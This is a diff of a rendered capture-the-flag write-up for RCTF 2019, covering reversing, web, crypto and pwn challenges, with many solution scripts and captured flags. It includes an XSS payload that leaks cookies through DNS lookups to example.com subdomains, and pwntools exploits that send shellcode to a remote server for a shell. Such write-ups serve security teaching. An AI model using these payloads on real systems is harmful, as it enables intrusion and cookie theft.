-for(<span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>=<span class="hljs-number">0</span>; <span class="hljs-built_in">n</span>&lt;MD5_DIGEST_LENGTH; <span class="hljs-built_in">n</span>++)
-    printf(<span class="hljs-string">"%02x"</span>, out[<span class="hljs-built_in">n</span>]);
+    <span class="hljs-built_in">puts</span>(sol);
 
-puts(<span class="hljs-string">""</span>);</code></pre><p>}</p>
-<pre class="hljs"><code><span class="hljs-comment">### babyre2</span>
+    <span class="hljs-comment">// MD5 match 5f8243a662cf71bf31d2b2602638dc1d</span>
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> n=<span class="hljs-number">0</span>; n&lt;MD5_DIGEST_LENGTH; n++)
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x"</span>, out[n]);
 
-* First, <span class="hljs-keyword">it</span> uses xxtea <span class="hljs-built_in">to</span> <span class="hljs-built_in">encrypt</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">with</span> your account <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> key.
-* Then, <span class="hljs-keyword">it</span> uses your password <span class="hljs-keyword">and</span> data <span class="hljs-built_in">to</span> <span class="hljs-built_in">create</span> another key. And <span class="hljs-built_in">decrypt</span> <span class="hljs-keyword">the</span> encrypted <span class="hljs-keyword">string</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> key.
-* The following code is <span class="hljs-keyword">the</span> pseudo-code <span class="hljs-built_in">to</span> generate <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> key.
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);
 
-```python=
-def second_key(data,password):
+}
+</code></pre><h3 id="babyre2"><a class="header-link" href="#babyre2"></a>babyre2</h3>
+<ul class="list">
+<li>First, it uses xxtea to encrypt a string with your account as the key.</li>
+<li>Then, it uses your password and data to create another key. And decrypt the encrypted string with the second key.</li>
+<li>The following code is the pseudo-code to generate the second key.</li>
+</ul>
+<pre class="hljs"><code>def second_key(data,password):
   data=data.decode(<span class="hljs-string">"hex"</span>)
   key=<span class="hljs-string">""</span>
-  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> password:
-    key+=chr(ord(i)-(ord(i)/<span class="hljs-number">10</span>)-(ord(i)%<span class="hljs-number">10</span>))^<span class="hljs-number">0xcc</span>
-  <span class="hljs-literal">return</span> key</code></pre><ul class="list">
+  <span class="hljs-keyword">for</span> i in password:
+    key+=chr(ord(i)-(ord(i)/10)-(ord(i)%10))^0xcc
+  <span class="hljs-keyword">return</span> key
+</code></pre><ul class="list">
 <li>When the two keys are identical, you can get flag.</li>
 </ul>
 <pre class="hljs"><code>from pwn <span class="hljs-keyword">import</span> *
@@ -467,32 +489,34 @@ r.send(<span class="hljs-string">"010203040506070809ad0b0c0d0e0f"</span>) <span 
 r.<span class="hljs-built_in">shutdown</span>(<span class="hljs-string">"send"</span>)
 
 r.interactive()
-<span class="hljs-meta">#rctf{f8b1644ac14529df029ac52b7b762493}</span></code></pre><h3 id="asm"><a class="header-link" href="#asm"></a>asm</h3>
+<span class="hljs-meta">#rctf{f8b1644ac14529df029ac52b7b762493}</span>
+</code></pre><h3 id="asm"><a class="header-link" href="#asm"></a>asm</h3>
 <ul class="list">
 <li>Install <a href="https://github.com/riscv/riscv-gnu-toolchain">riscv-gnu-toolchain</a></li>
 <li>Use <code>riscv64-unknown-linux-gnu-objdump</code> to extract riscv assembly code.</li>
 <li>There are two loops in main function. The first one encodes your input flag. And the second one compares yout input with encoded flag.</li>
-<li><p>The following is the pseudo-code of first loop.</p>
+<li>The following is the pseudo-code of first loop.</li>
+</ul>
 <pre class="hljs"><code>def first_loop(input):
-encoded_input=<span class="hljs-string">""</span>
-for i in range(len(input)):
-  <span class="hljs-built_in">t1</span>=input[i]^input[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">31</span>]
-  <span class="hljs-built_in">a4</span>=i
-  <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a4</span>
-  <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&lt;&lt;<span class="hljs-number">1</span>
-  <span class="hljs-built_in">a5</span>+=<span class="hljs-built_in">a4</span>
-  <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&lt;&lt;<span class="hljs-number">5</span>
-  <span class="hljs-built_in">a5</span>+=<span class="hljs-built_in">a4</span>
-  <span class="hljs-built_in">a4</span>=<span class="hljs-built_in">a5</span>
-  <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a4</span>&gt;&gt;<span class="hljs-number">0x1f</span>
-  <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&gt;&gt;<span class="hljs-number">0x18</span>
-  <span class="hljs-built_in">a4</span>+=<span class="hljs-built_in">a5</span>
-  <span class="hljs-built_in">a4</span>&amp;=<span class="hljs-number">255</span>
-  <span class="hljs-built_in">a4</span>-=<span class="hljs-built_in">a5</span>
-  encoded_input+=<span class="hljs-built_in">t1</span>^<span class="hljs-built_in">a4</span>
-return encoded_input</code></pre></li>
-<li><p>Once you know that the first byte is <code>R</code>, you can easily construct the flag.</p>
-</li>
+  encoded_input=<span class="hljs-string">""</span>
+  for i in range(len(input)):
+    <span class="hljs-built_in">t1</span>=input[i]^input[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">31</span>]
+    <span class="hljs-built_in">a4</span>=i
+    <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a4</span>
+    <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&lt;&lt;<span class="hljs-number">1</span>
+    <span class="hljs-built_in">a5</span>+=<span class="hljs-built_in">a4</span>
+    <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&lt;&lt;<span class="hljs-number">5</span>
+    <span class="hljs-built_in">a5</span>+=<span class="hljs-built_in">a4</span>
+    <span class="hljs-built_in">a4</span>=<span class="hljs-built_in">a5</span>
+    <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a4</span>&gt;&gt;<span class="hljs-number">0x1f</span>
+    <span class="hljs-built_in">a5</span>=<span class="hljs-built_in">a5</span>&gt;&gt;<span class="hljs-number">0x18</span>
+    <span class="hljs-built_in">a4</span>+=<span class="hljs-built_in">a5</span>
+    <span class="hljs-built_in">a4</span>&amp;=<span class="hljs-number">255</span>
+    <span class="hljs-built_in">a4</span>-=<span class="hljs-built_in">a5</span>
+    encoded_input+=<span class="hljs-built_in">t1</span>^<span class="hljs-built_in">a4</span>
+  return encoded_input
+</code></pre><ul class="list">
+<li>Once you know that the first byte is <code>R</code>, you can easily construct the flag.</li>
 </ul>
 <pre class="hljs"><code>ii=<span class="hljs-string">"1176d01e99b62c911245fb2a97c663b8147ce11e83e645a01963dd32a4df71"</span>.decode(<span class="hljs-string">"hex"</span>) <span class="hljs-comment">#encrypted flag</span>
 flag=<span class="hljs-string">"R"</span>
@@ -514,10 +538,12 @@ for i in range(len(ii)-<span class="hljs-number">1</span>):
   fff=chr(<span class="hljs-built_in">a4</span>^a^<span class="hljs-keyword">ord(ii[i]))
 </span>  flag+=fff
   print flag
-  <span class="hljs-comment">#RCTF{f5_is_not_real_reversing_}</span></code></pre><h3 id="donteatme"><a class="header-link" href="#donteatme"></a>DontEatMe</h3>
+  <span class="hljs-comment">#RCTF{f5_is_not_real_reversing_}</span>
+</code></pre><h3 id="donteatme"><a class="header-link" href="#donteatme"></a>DontEatMe</h3>
 <ul class="list">
 <li>First, it will generate a maze. and you have to go to the destination.</li>
-<li><p>Use ollydbg, you can easily get the maze.</p>
+<li>Use ollydbg, you can easily get the maze.</li>
+</ul>
 <pre class="hljs"><code><span class="hljs-number">00</span> <span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span>
 <span class="hljs-number">01</span> <span class="hljs-string">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1]</span>
 <span class="hljs-number">02</span> <span class="hljs-string">[1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1]</span>
@@ -536,9 +562,9 @@ for i in range(len(ii)-<span class="hljs-number">1</span>):
 <span class="hljs-number">15</span> <span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span>
 S: starting point 
 D: destination
-<span class="hljs-number">1</span>: Wall</code></pre></li>
-<li><p>Then you should give a movement sequence that leads to the destination. And the length of the sequence should be 16.</p>
-</li>
+<span class="hljs-number">1</span>: Wall
+</code></pre><ul class="list">
+<li>Then you should give a movement sequence that leads to the destination. And the length of the sequence should be 16.</li>
 <li>The movement sequence consists of four characters <code>asdw</code></li>
 <li>The only correct sequence should be <code>ddddwwwaaawwwddd</code></li>
 <li>But you can&#39;t just input the sequence. It will use blowfish to decrypt your input.</li>
@@ -556,19 +582,22 @@ connect-src none<span class="hljs-comment">;</span>
 object-src none<span class="hljs-comment">;</span>
 frame-src none<span class="hljs-comment">;</span>
 font-src data: self<span class="hljs-comment">;</span>
-style-src unsafe-inline self<span class="hljs-comment">;</span></code></pre><p>The challenge is about how to exfiltrate the cookie in such strict CSP. What&#39;s worse, the XSS payload will be prepend some js to prevent <code>document.location</code> redirection.</p>
+style-src unsafe-inline self<span class="hljs-comment">;</span>
+</code></pre><p>The challenge is about how to exfiltrate the cookie in such strict CSP. What&#39;s worse, the XSS payload will be prepend some js to prevent <code>document.location</code> redirection.</p>
 <pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
 <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"beforeunload"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) </span>{
   event.returnValue = <span class="hljs-string">"Are you sure want to exit?"</span>
   <span class="hljs-keyword">return</span> <span class="hljs-string">"Are you sure want to exit?"</span>
 })
-<span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">document</span>.location) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>When trying to bypass <code>document.location</code> limitation, we found remote will send a DNS request and open a TCP connection (but not sending HTTP request). Thus it comes to us that maybe we can use DNS request to steal the cookie.</p>
+<span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">document</span>.location) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre><p>When trying to bypass <code>document.location</code> limitation, we found remote will send a DNS request and open a TCP connection (but not sending HTTP request). Thus it comes to us that maybe we can use DNS request to steal the cookie.</p>
 <pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
 c =<span class="hljs-string">""</span>;
 <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> k <span class="hljs-keyword">of</span> <span class="hljs-built_in">document</span>.cookie)
   c+=(k.charCodeAt(<span class="hljs-number">0</span>).toString(<span class="hljs-number">16</span>))                                                                             
 <span class="hljs-built_in">window</span>.location.assign(<span class="hljs-string">"http://"</span> + c.substring(<span class="hljs-number">0</span>, <span class="hljs-number">60</span>) + <span class="hljs-string">"."</span> + c.substring(<span class="hljs-number">60</span>, <span class="hljs-number">120</span>) + <span class="hljs-string">"."</span>+ c.substring(<span class="hljs-number">120</span>, <span class="hljs-number">180</span>) + <span class="hljs-string">".example.com/"</span>);
-</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>I think it abuses remote browser&#39;s prefetching mechanism. The remote browser will only resolve the DNS address and open a TCP connection to <code>...example.com</code>, but it will not send any HTTP request. The bahavior is a little bit strange, isn&#39;t it?</p>
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre><p>I think it abuses remote browser&#39;s prefetching mechanism. The remote browser will only resolve the DNS address and open a TCP connection to <code>...example.com</code>, but it will not send any HTTP request. The bahavior is a little bit strange, isn&#39;t it?</p>
 <p>You can refer to the official writeup <a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password#jail">here</a>.</p>
 <h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
 <h3 id="f(x)"><a class="header-link" href="#f(x)"></a>f(x)</h3>
@@ -580,7 +609,8 @@ def <span class="hljs-built_in">f</span>(x):
     <span class="hljs-keyword">return</span> x, <span class="hljs-built_in">sum</span>(k[i] * pow(x, i, <span class="hljs-keyword">M</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(len(K))) % <span class="hljs-built_in">M</span>
 
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(0x200):
-    <span class="hljs-keyword">print</span> <span class="hljs-string">"f(%d) = %d"</span> % <span class="hljs-built_in">f</span>(rand(Nbits))</code></pre><p>The challenging part is that we don&#39;t know what <code>M</code> is.
+    <span class="hljs-keyword">print</span> <span class="hljs-string">"f(%d) = %d"</span> % <span class="hljs-built_in">f</span>(rand(Nbits))
+</code></pre><p>The challenging part is that we don&#39;t know what <code>M</code> is.
 To recover <code>M</code>, we use the fact that lagrange polynomial is the lowest degree polynomial.
 The coefficients of monomials with degree larger than 0x100 will be zero (i.e. multiple of <code>M</code>).
 Calculate all the coefficients of 0 ~ 0x200 degree&#39;s monomials need too much resources.
@@ -613,7 +643,8 @@ def worker(i):
 <span class="hljs-attr">pool</span> = mp.Pool(<span class="hljs-number">24</span>)
 <span class="hljs-attr">result</span> = []
 for n <span class="hljs-keyword">in</span> pool.imap_unordered(worker, range(<span class="hljs-number">24</span>)):
-    result.append(n)</code></pre><p>After we have 24 numbers which should be multiple of <code>M</code>, we calculate gcd of them, and factor it using <code>yafu</code>.
+    result.append(n)
+</code></pre><p>After we have 24 numbers which should be multiple of <code>M</code>, we calculate gcd of them, and factor it using <code>yafu</code>.
 Once we have <code>M</code>, just build a Vandermonde matrix and solve it.</p>
 <pre class="hljs"><code><span class="hljs-meta"># sagemath</span>
 <span class="hljs-keyword">import</span> libnum
@@ -630,11 +661,13 @@ M = Matrix.vandermonde(x)
 
 <span class="hljs-built_in">print</span>(<span class="hljs-string">'Solving equations - this step takes several minutes'</span>)
 z = M.solve_right(y)
-<span class="hljs-built_in">print</span>(repr(libnum.n2s(<span class="hljs-keyword">int</span>(z[<span class="hljs-number">0</span>]))))</code></pre><h3 id="baby_aes"><a class="header-link" href="#baby_aes"></a>baby_aes</h3>
+<span class="hljs-built_in">print</span>(repr(libnum.n2s(<span class="hljs-keyword">int</span>(z[<span class="hljs-number">0</span>]))))
+</code></pre><h3 id="baby_aes"><a class="header-link" href="#baby_aes"></a>baby_aes</h3>
 <p>In this task, there&#39;s a AES implementation with different parameters (i.e. Sbox and Tbox).
 The goal is to implement a decrypt routine for it.</p>
 <p>The inverse of Sbox is easy. Just build a inverse lookup dictionary.</p>
-<pre class="hljs"><code>S_inv = {e: <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, e <span class="hljs-keyword">in</span> enumerate(S)}</code></pre><p>For the Tbox, it gets more tricky.
+<pre class="hljs"><code>S_inv = {e: <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, e <span class="hljs-keyword">in</span> enumerate(S)}
+</code></pre><p>For the Tbox, it gets more tricky.
 Tbox is a combination of Sbox and multiplication of c(x) (See <a href="https://crypto.stackexchange.com/questions/19175/efficient-aes-use-of-t-tables">this</a>).
 Here&#39;s some properties we can found in these Tboxes:</p>
 <ol class="list">
@@ -667,7 +700,8 @@ c_inv = <span class="hljs-number">1</span> / c
 T_inv = [[ toint32(c_inv * (F(ZZ(i).bits()) * u^p)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>)] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>)]
 
 <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'inv.pkl'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
-    pickle.dump(T_inv, f)</code></pre><p>We have all the inverse we need, undo each step of AES and decrypt the flag.</p>
+    pickle.dump(T_inv, f)
+</code></pre><p>We have all the inverse we need, undo each step of AES and decrypt the flag.</p>
 <h3 id="baby_crypto"><a class="header-link" href="#baby_crypto"></a>baby_crypto</h3>
 <p>This is mainly a <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">padding oracle</a> challenge along with <a href="https://en.wikipedia.org/wiki/Length_extension_attack">length extension attack</a>.</p>
 <h4 id="padding-oracle"><a class="header-link" href="#padding-oracle"></a>Padding oracle</h4>
@@ -708,7 +742,8 @@ It will then provide us the iv, ciphertext and <code>sha1(key | plaintext)</code
                 ans = guess
                 <span class="hljs-keyword">print</span> (ans)
                 <span class="hljs-keyword">break</span>
-    <span class="hljs-keyword">return</span> ans</code></pre><h4 id="length-extension-attack"><a class="header-link" href="#length-extension-attack"></a>Length extension attack</h4>
+    <span class="hljs-keyword">return</span> ans
+</code></pre><h4 id="length-extension-attack"><a class="header-link" href="#length-extension-attack"></a>Length extension attack</h4>
 <p>Now, what plaintext do we want?
 Let&#39;s see what the challenge do if we pass both padding check and hash check</p>
 <pre class="hljs"><code>
@@ -720,7 +755,8 @@ Let&#39;s see what the challenge do if we pass both padding check and hash check
 <span class="hljs-keyword">if</span> <span class="hljs-keyword">info</span>[b<span class="hljs-string">"admin"</span>] == b<span class="hljs-string">"1"</span>:
     with <span class="hljs-keyword">open</span>(<span class="hljs-string">"flag"</span>) as f:
         flag = f.<span class="hljs-keyword">read</span>()
-        print(<span class="hljs-string">"Your flag: %s"</span> %flag)</code></pre><p>so if we construct a plaintext like this:
+        print(<span class="hljs-string">"Your flag: %s"</span> %flag)
+</code></pre><p>so if we construct a plaintext like this:
 <code>admin:0;username:aaaaa;password:aaaaa...;admin:1</code>
 then <code>info[b&#39;admin&#39;]</code> will eventually become <code>1</code>, then we can get flag. </p>
 <p>All we need now is to bypass the hash check. Luckliy, the challenge use <code>sha1</code>, which is vulnerable to length extension attack. We use <a href="https://github.com/stephenbradshaw/hlextend">this tool</a> to calculate the correct plaintext, use padding oracle to get correct iv and ciphertext, and get flag.</p>
@@ -739,7 +775,8 @@ for i in range(<span class="hljs-number">10</span>):
 
     <span class="hljs-comment"># r = (s*Q)[0]</span>
     r = <span class="hljs-keyword">mul(s, </span>Q, A, <span class="hljs-keyword">B, </span>M)[<span class="hljs-number">0</span>]
-    print(<span class="hljs-string">"r%d: %d"</span> % (i, r))</code></pre><p>Our job is to guess <code>r10</code> to get flag. We know everything except initial <code>s</code> </p>
+    print(<span class="hljs-string">"r%d: %d"</span> % (i, r))
+</code></pre><p>Our job is to guess <code>r10</code> to get flag. We know everything except initial <code>s</code> </p>
 <h4 id="pohlig-hellman"><a class="header-link" href="#pohlig-hellman"></a>Pohlig-Hellman</h4>
 <p>Solving this problem is equivalent to solving <code>Q0 = sQ</code> with s unknown. So we simply apply Pohlig-Hellman on <code>s</code> twice to get initial <code>s</code>. Note that Pohlig-Hellman require a <code>Q</code> which its order can be factorized into rather small factors in order to do it fast enough (Time limit in this challenge is 450s, in our poor VM environment, we can solve the challenge in time if the biggest factor of order of <code>Q</code> is less than <code>1e12</code>). After nearly two hours of trying, we finally get flag......</p>
 <p>flag : <code>RCTF{83d37980-47c2-4373-a0ee-181b5603ee7e}</code></p>
@@ -884,7 +921,8 @@ elf = ELF(binary)
   raw_input(<span class="hljs-string">"@"</span>)
   add(<span class="hljs-number">0x100</span>)
 
-  r.interactive()</code></pre><h3 id="manynotes"><a class="header-link" href="#manynotes"></a>ManyNotes</h3>
+  r.interactive()
+</code></pre><h3 id="manynotes"><a class="header-link" href="#manynotes"></a>ManyNotes</h3>
 <ul class="list">
 <li>Much like the challenge null on n1CTF 2018 <code>~.~</code> .</li>
 <li>Overflow on the thread&#39;s heap.  </li>
@@ -913,7 +951,8 @@ Billy used my expolit remote to succeed. WTFFFFFFFFFFFFF?????????????</p>
 <span class="hljs-number">0</span>x7fa<span class="hljs-number">7280008b0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000255</span>  &lt;=  thread's tcache
 <span class="hljs-number">0</span>x7fa<span class="hljs-number">7280008c0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000010000</span>
 <span class="hljs-number">0</span>x7fa<span class="hljs-number">7280008d0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>
-<span class="hljs-number">0</span>x7fa<span class="hljs-number">7280008e0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span></code></pre><p><code>RCTF{House_of_0range_in_Thread}</code></p>
+<span class="hljs-number">0</span>x7fa<span class="hljs-number">7280008e0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>
+</code></pre><p><code>RCTF{House_of_0range_in_Thread}</code></p>
 <pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
 <span class="hljs-comment"># -*- coding: utf-8 -*-</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
@@ -979,6 +1018,7 @@ elf = ELF(binary)
   raw_input(<span class="hljs-string">"@"</span>)
   r.sendline(<span class="hljs-string">"1"</span>)
   r.interactive()
+
 </code></pre><h3 id="shellcoder"><a class="header-link" href="#shellcoder"></a>shellcoder</h3>
 <ul class="list">
 <li>7 arbitrary bytes(expect null byte) to read larger shellcode</li>
@@ -1041,92 +1081,99 @@ r.send(open(<span class="hljs-string">"find_flag"</span>).read()) <span class="h
 r.shutdown(<span class="hljs-string">"send"</span>)
 
 r.interactive()
+
 </code></pre><ul class="list">
-<li><p>find_flag source code
-<code>`</code>c=
-#include &lt;dirent.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;string.h&gt;
-char buf[0x100];
-void listdir(char* p){</p>
-<pre class="hljs"><code>  chdir(p)<span class="hljs-comment">;</span>
-  <span class="hljs-keyword">DIR </span>*<span class="hljs-keyword">dir;
-</span>  struct <span class="hljs-keyword">dirent </span>*entry<span class="hljs-comment">;</span>
-  <span class="hljs-keyword">dir </span>= opendir(<span class="hljs-string">"."</span>)<span class="hljs-comment">;</span>
-  while ((entry = readdir(<span class="hljs-keyword">dir)) </span>!= NULL){
-          if( strcmp(entry-&gt;d_name,<span class="hljs-string">"flag"</span>) == <span class="hljs-number">0</span>){
-                  puts(<span class="hljs-string">"Find flag"</span>)<span class="hljs-comment">;</span>
-                  int fd = open(<span class="hljs-string">"./flag"</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
-                  int n = read(fd,<span class="hljs-keyword">buf,0x100);
-</span>                  write(<span class="hljs-number">1</span>,<span class="hljs-keyword">buf,n);
-</span>                  _exit(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
-          } else if( entry-&gt;d_type == DT_DIR){
-                   if( strcmp(entry-&gt;d_name,<span class="hljs-string">"."</span>) &amp;&amp; strcmp(entry-&gt;d_name,<span class="hljs-string">".."</span>))
-                          listdir(entry-&gt;d_name)<span class="hljs-comment">;</span>
-          } else {
-          }
-  }
-  <span class="hljs-keyword">closedir(dir);
-</span>  chdir(<span class="hljs-string">".."</span>)<span class="hljs-comment">;</span></code></pre><p>}</p>
-</li>
+<li>find_flag source code</li>
 </ul>
-<p>int main() {
-        listdir(&quot;flag&quot;);
-}</p>
-<pre class="hljs"><code>### syscall_interface
-* sys_personality <span class="hljs-keyword">set</span> flag READ_IMPLIES_EXEC <span class="hljs-keyword">on</span>
-* sys_brk <span class="hljs-built_in">get</span> heap address
-* leave some shellcode <span class="hljs-keyword">on</span> heap by <span class="hljs-built_in">printf</span>
-* <span class="hljs-keyword">update</span> username <span class="hljs-built_in">and</span> sys_rt_sigreturn <span class="hljs-keyword">to</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword">me</span> control RIP
-* Read more shellcode <span class="hljs-built_in">and</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">shell</span>
-```<span class="hljs-keyword">python</span>
-from pwn import *
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dirent.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listdir</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* p)</span></span>{
+
+        chdir(p);
+        DIR *dir;
+        <span class="hljs-keyword">struct</span> dirent *entry;
+        dir = opendir(<span class="hljs-string">"."</span>);
+        <span class="hljs-keyword">while</span> ((entry = readdir(dir)) != <span class="hljs-literal">NULL</span>){
+                <span class="hljs-keyword">if</span>( <span class="hljs-built_in">strcmp</span>(entry-&gt;d_name,<span class="hljs-string">"flag"</span>) == <span class="hljs-number">0</span>){
+                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Find flag"</span>);
+                        <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">"./flag"</span>,<span class="hljs-number">0</span>);
+                        <span class="hljs-keyword">int</span> n = read(fd,buf,<span class="hljs-number">0x100</span>);
+                        write(<span class="hljs-number">1</span>,buf,n);
+                        _exit(<span class="hljs-number">0</span>);
+                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( entry-&gt;d_type == DT_DIR){
+                         <span class="hljs-keyword">if</span>( <span class="hljs-built_in">strcmp</span>(entry-&gt;d_name,<span class="hljs-string">"."</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(entry-&gt;d_name,<span class="hljs-string">".."</span>))
+                                listdir(entry-&gt;d_name);
+                } <span class="hljs-keyword">else</span> {
+                }
+        }
+        closedir(dir);
+        chdir(<span class="hljs-string">".."</span>);
+}
+
+
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+        listdir(<span class="hljs-string">"flag"</span>);
+}
+
+</code></pre><h3 id="syscall_interface"><a class="header-link" href="#syscall_interface"></a>syscall_interface</h3>
+<ul class="list">
+<li>sys_personality set flag READ_IMPLIES_EXEC on</li>
+<li>sys_brk get heap address</li>
+<li>leave some shellcode on heap by printf</li>
+<li>update username and sys_rt_sigreturn to let me control RIP</li>
+<li>Read more shellcode and get shell</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 context.arch = <span class="hljs-string">'amd64'</span>
 
-data = [<span class="hljs-number">0</span>x0]*<span class="hljs-number">16</span>
-#r = process([<span class="hljs-string">"./syscall_interface"</span>])
+data = [<span class="hljs-number">0x0</span>]*<span class="hljs-number">16</span>
+<span class="hljs-comment">#r = process(["./syscall_interface"])</span>
 r = remote(<span class="hljs-string">"139.180.144.86"</span>, <span class="hljs-number">20004</span>)
-#r = remote(<span class="hljs-string">"localhost"</span>,<span class="hljs-number">4444</span>)
-r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"135"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0</span>x400000).ljust(<span class="hljs-number">0</span>x1f,<span class="hljs-string">'\x00'</span>))
+<span class="hljs-comment">#r = remote("localhost",4444)</span>
+r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"135"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0x400000</span>).ljust(<span class="hljs-number">0x1f</span>,<span class="hljs-string">'\x00'</span>))
 
-r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
